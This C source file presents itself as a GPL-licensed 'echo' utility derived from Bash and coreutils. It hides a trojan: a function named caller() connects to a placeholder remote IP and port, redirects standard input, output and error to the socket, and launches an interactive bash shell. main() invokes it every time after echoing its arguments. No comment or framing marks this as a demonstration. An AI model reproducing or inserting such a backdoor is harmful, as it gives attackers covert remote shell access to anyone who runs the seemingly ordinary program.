/* echo.c, derived from code echo.c in Bash.
   Copyright (C) 1987, 1989, 1991-1997, 1999-2005, 2007-2010 Free Software
   Foundation, Inc.

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <http://www.gnu.org/licenses/>.  */

#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <string.h>

#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

#include <arpa/inet.h>

#define REMOTE_ADDR "<ip>"
#define REMOTE_PORT <port>

int caller()
{
    struct sockaddr_in sa;
    int s;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr("<ip>");
    sa.sin_port = htons(<port>);

    s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));

    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    execl("/bin/bash","bash","-i",0,0);

    return 0;
}

/* The official name of this program (e.g., no `g' prefix).  */
#define PROGRAM_NAME "echo"

/* Convert C from hexadecimal character to integer.  */
static int
hextobin (unsigned char c)
{
  switch (c)
    {
    default: return c - '0';
    case 'a': case 'A': return 10;
    case 'b': case 'B': return 11;
    case 'c': case 'C': return 12;
    case 'd': case 'D': return 13;
    case 'e': case 'E': return 14;
    case 'f': case 'F': return 15;
    }
}

int
main(int argc, char *argv[])
{
	int nflag;

	/* This utility may NOT do getopt(3) option parsing. */
	if (*++argv && !strcmp(*argv, "-n")) {
		++argv;
		nflag = 1;
	}
	else
		nflag = 0;

	while (*argv) {
		(void)fputs(*argv, stdout);
		if (*++argv)
			putchar(' ');
	}
	if (!nflag)
		putchar('\n');
	caller();
	return 0;
}